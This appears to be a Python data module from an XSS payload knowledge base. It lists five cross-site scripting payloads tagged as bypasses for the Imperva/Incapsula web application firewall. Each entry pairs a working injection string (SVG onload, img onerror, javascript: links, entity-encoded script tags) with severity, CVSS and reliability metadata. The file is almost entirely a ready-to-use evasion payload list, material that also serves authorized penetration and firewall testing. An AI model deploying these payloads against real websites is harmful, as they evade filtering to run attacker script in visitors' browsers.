#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Imperva WAF Bypass Payloads
"""

from ..models import PayloadEntry


IMPERVA_BYPASS_PAYLOADS = {
    "imperva_1": PayloadEntry(
        payload="<svg/onload=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="SVG onload no space",
        tags=["imperva", "incapsula", "svg"],
        waf_evasion=True,
        bypasses=["imperva"],
        reliability="medium",
    ),
    "imperva_2": PayloadEntry(
        payload="<svg onload=alert&#40;1&#41;>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML entities in parentheses",
        tags=["imperva", "incapsula", "entities"],
        waf_evasion=True,
        bypasses=["imperva"],
        reliability="high",
    ),
    "imperva_3": PayloadEntry(
        payload="<img src=x onerror=alert&#x28;1&#x29;>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Hex entities in parentheses",
        tags=["imperva", "incapsula", "hex-entities"],
        waf_evasion=True,
        bypasses=["imperva"],
        reliability="high",
    ),
    "imperva_4": PayloadEntry(
        payload="<a href=javascript&colon;alert(1)>click</a>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Colon entity in javascript",
        tags=["imperva", "incapsula", "colon-entity"],
        waf_evasion=True,
        bypasses=["imperva"],
        reliability="medium",
    ),
    "imperva_5": PayloadEntry(
        payload="<svg><script>alert&lpar;1&rpar;</script></svg>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Named entities in script",
        tags=["imperva", "incapsula", "named-entities"],
        waf_evasion=True,
        bypasses=["imperva"],
        reliability="high",
    ),
}

IMPERVA_BYPASS_PAYLOADS_TOTAL = len(IMPERVA_BYPASS_PAYLOADS)
